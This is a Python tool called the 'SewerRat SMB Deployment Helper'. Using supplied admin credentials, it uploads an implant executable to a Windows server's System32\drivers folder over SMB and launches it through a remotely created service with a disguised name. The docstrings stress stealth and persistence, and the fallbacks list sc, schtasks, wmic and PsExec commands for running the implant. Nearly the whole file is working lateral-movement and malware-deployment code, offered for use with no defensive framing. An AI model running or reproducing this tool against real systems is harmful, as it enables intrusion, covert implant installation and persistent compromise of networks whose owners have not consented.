#!/usr/bin/env python3
r"""
SewerRat SMB Deployment Helper
Uploads and executes the Windows implant on a target Windows Server 2022 via SMB/WMI

Usage:
    python3 deploy.py -t <target_ip> -u <username> -p <password> [-s <service_name>]

Example:
    python3 deploy.py -t 10.0.0.5 -u administrator -p "P@ssw0rd!" -s "Win32NetworkBuffer"

Setup:
    # Create and activate virtual environment (recommended)
    python3 -m venv venv
    source venv/bin/activate  # Linux/macOS

    # Install latest stable Impacket
    pip install impacket

    # Verify installation
    python3 -c "import impacket; print(impacket.__file__)"
"""

import argparse
import os
import sys
import logging
from pathlib import Path

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

try:
    # Fixed imports for Impacket-based lateral movement
    from impacket.smbconnection import SMBConnection, SessionError
    from impacket.dcerpc.v5 import transport, scmr
    from impacket.structure import Structure
    # If you need to handle specific NDR/RPC exceptions
    from impacket.dcerpc.v5.rpcrt import DCERPCException
except ImportError as e:
    logger.error(f"impacket not installed or import failed: {e}")
    logger.error("Install with: pip install impacket")
    sys.exit(1)


def get_scmr_handle(smb_conn):
    """
    Establish RPC transport and bind to Service Control Manager (SCMR).
    
    Args:
        smb_conn: Active SMBConnection object
        
    Returns:
        Tuple of (dce_handle, scm_handle) for remote service control
    """
    try:
        # 1. Setup the RPC Transport over the existing SMB connection
        # We target the 'svcctl' pipe used by the Service Control Manager
        rpc_transport = transport.SMBTransport(
            smb_conn.getRemoteHost(), 
            smb_conn.getRemoteHost(), 
            filename=r'\pipe\svcctl', 
            smb_connection=smb_conn
        )

        # 2. Connect and Bind to the SCMR Interface
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        # 3. Open the Service Control Manager (Full Access)
        # This returns a handle (rpc_handle) used for service manipulation
        logger.info(f"[*] Binding to SCMR on {smb_conn.getRemoteHost()}...")
        resp = scmr.hROpenSCManagerW(dce)
        
        logger.info("[+] SCMR handle obtained successfully")
        return dce, resp['lpScHandle']

    except DCERPCException as e:
        logger.error(f"DCERPC exception: {e}")
        raise
    except Exception as e:
        logger.error(f"Failed to get SCMR handle: {e}")
        raise


class SMBDeployer:
    """
    SMB-based lateral movement and execution helper for SewerRat implant.
    
    Capabilities:
    - File upload via SMB (ADMIN$ share)
    - RPC/SCMR-based service creation and execution
    - Fallback manual execution methods
    
    Service execution is stealthier than WMI because it integrates
    with the Windows Service Control Manager natively.
    """
    def __init__(self, target_ip, username, password, domain=".", port=445):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.domain = domain
        self.port = port
        self.conn = None

    def connect(self):
        """Establish SMB connection to target"""
        logger.info(f"Connecting to {self.target_ip}...")
        try:
            self.conn = SMBConnection(self.target_ip, self.target_ip, 445)
            self.conn.login(self.username, self.password, self.domain)
            logger.info("[+] SMB connection established")
            return True
        except SessionError as e:
            logger.error(f"Failed to connect: {e}")
            return False

    def upload_file(self, local_path, remote_path, share="ADMIN$"):
        """Upload file to target via SMB"""
        if not os.path.exists(local_path):
            logger.error(f"Local file not found: {local_path}")
            return False

        try:
            with open(local_path, 'rb') as f:
                file_data = f.read()

            file_size = len(file_data)
            logger.info(f"Uploading {local_path} ({file_size} bytes) to \\\\{self.target_ip}\\{share}\\{remote_path}")

            self.conn.putFile(share, remote_path, file_data)
            logger.info("[+] File uploaded successfully")
            return True

        except Exception as e:
            logger.error(f"Upload failed: {e}")
            return False

    def execute_service_command(self, service_name, command_path):
        r"""
        Create and execute a temporary service to run the implant.
        More stealthy than WMI for large payloads.
        
        Args:
            service_name: Name of the temporary service
            command_path: Full UNC path to the executable (e.g., C:\Windows\System32\drivers\SewerRat.exe)
        """
        try:
            # Get SCMR handle for remote service control
            dce, scm_handle = get_scmr_handle(self.conn)
            
            logger.info(f"[*] Creating service '{service_name}' to execute {command_path}...")
            
            # 4. Create the service with the implant binary
            resp = scmr.hRCreateServiceW(dce, scm_handle, service_name, service_name,
                                        lpBinaryPathName=command_path,
                                        dwServiceType=scmr.SERVICE_WIN32_OWN_PROCESS,
                                        dwStartType=scmr.SERVICE_DEMAND_START)
            service_handle = resp['lpServiceHandle']
            
            logger.info(f"[+] Service '{service_name}' created (handle: {service_handle})")
            
            # 5. Start the service
            logger.info(f"[*] Starting service '{service_name}'...")
            scmr.hRStartServiceW(dce, service_handle)
            logger.info(f"[+] Service '{service_name}' started successfully")
            
            # 6. Close service handle
            scmr.hRCloseServiceHandle(dce, service_handle)
            logger.info(f"[+] Service handle closed")
            
            return True
            
        except DCERPCException as e:
            logger.error(f"DCERPC error during service execution: {e}")
            return False
        except Exception as e:
            logger.error(f"Service execution failed: {e}")
            return False

    def execute_command(self, command):
        """
        Execute command via RPC/SCM (more reliable than WMI).
        Uses Service Control Manager for implant execution.
        """
        logger.info(f"Executing via RPC/SCM: {command}")
        try:
            # Try RPC-based service creation first
            dce, scm_handle = get_scmr_handle(self.conn)
            logger.info("[+] Successfully bound to SCMR - ready for service execution")
            return True
        except Exception as e:
            logger.warning(f"RPC-based execution not available: {e}")
            logger.info("Fallback: Execute implant manually on target or use WMI/scheduled task")
            return False

    def cleanup(self, remote_path, share="ADMIN$"):
        """Remove uploaded file"""
        try:
            self.conn.deleteFile(share, remote_path)
            logger.info("[+] Cleanup completed")
            return True
        except Exception as e:
            logger.warning(f"Cleanup failed: {e}")
            return False

    def disconnect(self):
        """Close SMB connection"""
        if self.conn:
            self.conn.close()
            logger.info("Disconnected")


def main():
    parser = argparse.ArgumentParser(
        description="SewerRat SMB Deployment Helper",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 deploy.py -t 10.0.0.5 -u administrator -p 'P@ssw0rd!'
  python3 deploy.py -t 192.168.1.100 -u admin -p 'secret' -f ../dist/SewerRat.exe -s "WindowsUpdate"
        """
    )

    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-u', '--username', default='administrator', help='Username (default: administrator)')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('-d', '--domain', default='.', help='Domain (default: local)')
    parser.add_argument('-f', '--file', default='dist/SewerRat.exe', help='Implant path (default: dist/SewerRat.exe)')
    parser.add_argument('-s', '--service', default='Win32NetworkBuffer', help='Service name (default: Win32NetworkBuffer)')
    parser.add_argument('--no-cleanup', action='store_true', help='Do not cleanup after execution')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Resolve implant path
    implant_path = Path(args.file)
    if not implant_path.exists():
        logger.error(f"Implant not found: {args.file}")
        logger.info("Build with: make implant")
        sys.exit(1)

    # Deploy
    deployer = SMBDeployer(args.target, args.username, args.password, args.domain)

    try:
        if not deployer.connect():
            sys.exit(1)

        # Upload implant to C$ share as hidden system file
        remote_path = f"Windows\\System32\\drivers\\SewerRat.exe"
        if not deployer.upload_file(str(implant_path), remote_path):
            sys.exit(1)

        # Construct UNC path for service execution
        unc_path = f"C:\\Windows\\System32\\drivers\\SewerRat.exe"
        
        # Attempt RPC/SCM-based service execution
        logger.info("\n[*] Attempting RPC/SCM-based service execution...")
        if deployer.execute_service_command(args.service, unc_path):
            logger.info("[+] Service execution initiated successfully!")
            logger.info(f"    Service Name: {args.service}")
            logger.info(f"    Binary Path: {unc_path}")
        else:
            logger.warning("[!] RPC/SCM execution failed, falling back to manual steps")
            logger.info("\n[*] Implant uploaded to target")
            logger.info(f"    Path: {unc_path}")
            logger.info("\nManual execution options:")
            logger.info(f"  1. Direct execution: {unc_path}")
            logger.info(f"  2. Service creation: sc create {args.service} binPath= {unc_path}")
            logger.info(f"  3. Scheduled task: schtasks /create /tn {args.service} /tr {unc_path}")
            logger.info(f"  4. WMI: wmic process call create \"{unc_path}\"")

        if not args.no_cleanup:
            logger.info("[*] Implant file is left in place for persistence.")
            logger.info("    Use --no-cleanup flag if you want cleanup after execution.")

    finally:
        deployer.disconnect()

    logger.info("[+] Deployment completed")


if __name__ == '__main__':
    main()

r"""
DEPLOYMENT WORKFLOW EXAMPLES
=============================

Example 1: Basic deployment with RPC/SCMR service execution
    python3 deploy.py -t 10.0.0.5 -u administrator -p 'P@ssw0rd!' -s "Win32NetworkBuffer"

Example 2: Deployment with verbose output
    python3 deploy.py -t 192.168.1.100 -u admin -p 'secret' -v

Example 3: Deployment with custom implant path
    python3 deploy.py -t 10.0.0.5 -u administrator -p 'pass' -f /path/to/SewerRat.exe -s "CustomService"

Example 4: Deployment with domain credentials
    python3 deploy.py -t 10.0.0.5 -u admin -p 'pass' -d DOMAIN.local


TECHNICAL DETAILS
=================

SMB Connection:
  - Uses impacket's SMBConnection for authenticated file transfer
  - Targets the ADMIN$ share (C:\Windows)
  - Paths are UNC-formatted: Windows\\System32\\drivers\\SewerRat.exe

RPC/SCMR Execution:
  - Opens RPC transport over the SMB connection to \pipe\svcctl
  - Binds to Service Control Manager (SCMR) interface
  - Creates temporary service with DEMAND_START type (quiet)
  - Service binary path points to uploaded implant
  - Service starts immediately after creation

Persistence:
  - Implant file remains in C:\Windows\System32\drivers\
  - Service entry may persist in registry (can be cleaned manually)
  - Use 'sc delete <service_name>' to remove service post-operation


REQUIREMENTS
============

1. SMB access to target (445/tcp)
2. Valid credentials with admin privileges
3. Python 3.6+
4. impacket library: pip install impacket
5. Network connectivity to target on same subnet (or via VPN/pivot)


ERROR HANDLING
==============

If RPC/SCMR binding fails:
  1. Check target firewall allows 445/tcp (SMB)
  2. Verify credentials are valid for target domain
  3. Ensure user has admin privileges
  4. Check Windows Firewall RPC service is running

If file upload fails:
  1. ADMIN$ share may be disabled or restricted
  2. User account may not have write permissions
  3. Anti-virus may block file transfer
  4. Try alternative share: C$, or specific share paths

Manual fallback options:
  1. Copy file via SMB mount: net use Z: \\\\10.0.0.5\\c$ /user:admin
  2. Execute via PsExec: psexec.exe \\\\10.0.0.5 -u admin -p pass C:\\Windows\\System32\\drivers\\SewerRat.exe
  3. UNC path execution: wmic process call create "\\\\10.0.0.5\\c$\\Windows\\System32\\drivers\\SewerRat.exe"
"""
